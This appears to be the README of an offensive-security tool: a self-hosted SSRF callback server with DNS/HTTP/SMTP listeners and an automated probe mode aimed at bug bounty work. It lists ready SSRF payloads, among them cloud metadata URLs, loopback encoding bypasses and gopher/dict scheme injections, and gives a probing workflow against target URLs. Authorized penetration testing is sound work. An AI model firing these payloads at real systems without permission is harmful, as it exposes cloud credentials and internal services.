# SSRF Callback Server

> Self-hosted Burp Collaborator alternative. DNS + HTTP + HTTPS + SMTP listeners with a live browser dashboard and active SSRF probe mode.

No Burp Pro required. Deploy on any VPS, get your callback domain, find blind SSRF anywhere.

---

## What It Does

| Feature | Description |
|---------|-------------|
| **DNS Listener** | Captures DNS lookups — works even through strict firewalls |
| **HTTP/HTTPS Listener** | Full request capture with headers, body, path |
| **SMTP Listener** | Catches SMTP connections (email-based SSRF) |
| **Correlation IDs** | Every payload gets a unique ID — track which vuln triggered |
| **Live Dashboard** | Browser UI at port 8080 — real-time interaction feed |
| **Cloud Metadata Detection** | Flags AWS/GCP/Azure metadata hits automatically |
| **Probe Mode** | Actively tests a target URL across all parameters |
| **40+ Payload Types** | HTTP, DNS, schemes, cloud metadata, internal ports, IP bypasses |
| **Zero Dependencies** | Pure Python stdlib — no pip install |

---

## Setup (VPS Required for DNS)

```bash
# 1. Point a domain's NS records to your VPS
#    e.g. callback.yourserver.com → NS → yourserver.com (A record = your VPS IP)

# 2. Clone and run
git clone https://github.com/yourhandle/ssrf-callback-server
cd ssrf-callback-server

# 3. Start server (run as root for ports 53/80/443)
sudo python3 ssrf_server.py server \
  --domain callback.yourserver.com \
  --ip YOUR_VPS_IP

# 4. Open dashboard
# http://YOUR_VPS_IP:8080
```

---

## Usage

### Start the server
```bash
# Full server with all listeners
sudo python3 ssrf_server.py server \
  --domain callback.yourserver.com \
  --ip 1.2.3.4

# Custom ports (if you can't use privileged ports)
python3 ssrf_server.py server \
  --domain callback.yourserver.com \
  --ip 1.2.3.4 \
  --http-port 8080 \
  --dns-port 5353 \
  --no-smtp
```

### Generate payloads
```bash
python3 ssrf_server.py payloads --domain callback.yourserver.com
```

Output:
```
HTTP/HTTPS Callbacks
  http_direct            http://abc123def456.callback.yourserver.com/
  https_direct           https://abc123def456.callback.yourserver.com/

Cloud Metadata
  aws_metadata           http://169.254.169.254/latest/meta-data/
  gcp_metadata           http://metadata.google.internal/computeMetadata/v1/
  azure_metadata         http://169.254.169.254/metadata/instance?api-version=2021-02-01

IP Bypasses
  decimal_ip             http://2130706433/
  octal_ip               http://0177.0.0.01/
  hex_ip                 http://0x7f000001/
```

### Active probe mode
```bash
# Probe a target URL automatically
python3 ssrf_server.py probe \
  -u "https://target.com/api/fetch?url=https://example.com" \
  --domain callback.yourserver.com

# POST JSON body
python3 ssrf_server.py probe \
  -u "https://target.com/api/import" \
  -m POST \
  -d '{"url":"https://example.com"}' \
  --content-type json \
  --domain callback.yourserver.com \
  -c "session=TOKEN"

# Test specific parameters only
python3 ssrf_server.py probe \
  -u "https://target.com/webhook" \
  --domain callback.yourserver.com \
  -p url -p webhook -p callback
```

---

## Payload Types

### DNS (Most reliable — bypasses most firewalls)
```
abc123.callback.yourserver.com
```

### HTTP Direct
```
http://abc123.callback.yourserver.com/
```

### Protocol Schemes (for scheme-injection SSRF)
```
dict://abc123.callback.yourserver.com:11111/INFO
gopher://abc123.callback.yourserver.com:80/_GET%20/%20HTTP/1.0%0A%0A
ftp://abc123.callback.yourserver.com/
ldap://abc123.callback.yourserver.com/
```

### Cloud Metadata (for internal SSRF)
```
http://169.254.169.254/latest/meta-data/              # AWS
http://metadata.google.internal/computeMetadata/v1/   # GCP
http://169.254.169.254/metadata/instance               # Azure
http://100.100.100.200/latest/meta-data/               # Alibaba
```

### IP Encoding Bypasses
```
http://2130706433/        # 127.0.0.1 decimal
http://0177.0.0.01/       # 127.0.0.1 octal
http://0x7f000001/        # 127.0.0.1 hex
http://127.1/             # short form
http://[::1]/             # IPv6 loopback
http://[::ffff:127.0.0.1]/ # IPv6 mapped
```

---

## Bug Bounty Workflow

```
1. Deploy on VPS, set up DNS NS record to point to your VPS
2. Start server: sudo python3 ssrf_server.py server --domain YOUR_DOMAIN --ip YOUR_IP
3. Open dashboard: http://YOUR_IP:8080

4. For manual testing:
   - Generate payloads: python3 ssrf_server.py payloads --domain YOUR_DOMAIN
   - Inject into url=, webhook=, import=, fetch= params
   - Watch dashboard for callbacks

5. For automated testing:
   python3 ssrf_server.py probe -u TARGET_URL --domain YOUR_DOMAIN -c SESSION_COOKIE

6. AWS/GCP/Azure targets:
   - If you get DNS/HTTP callback, try: http://169.254.169.254/latest/meta-data/
   - Cloud metadata = Critical severity on any bug bounty program
```

---

## Dashboard

Access at `http://localhost:8080` (or your VPS IP).

- Live feed — new interactions appear instantly
- Click any interaction for full detail
- Filter by IP, correlation ID, or path
- Export all interactions as JSON
- One-click payload generator

---

## GitHub Info

**Description:**
```
Self-hosted SSRF/OOB callback server — DNS+HTTP+HTTPS+SMTP listeners, live dashboard, cloud metadata detection, active probe mode
```

**Topics:**
```
ssrf, out-of-band, oob, blind-ssrf, dns-callback, bug-bounty,
penetration-testing, python, offensive-security, cloud-security
```

---

## License

MIT — For authorized penetration testing and bug bounty programs only.
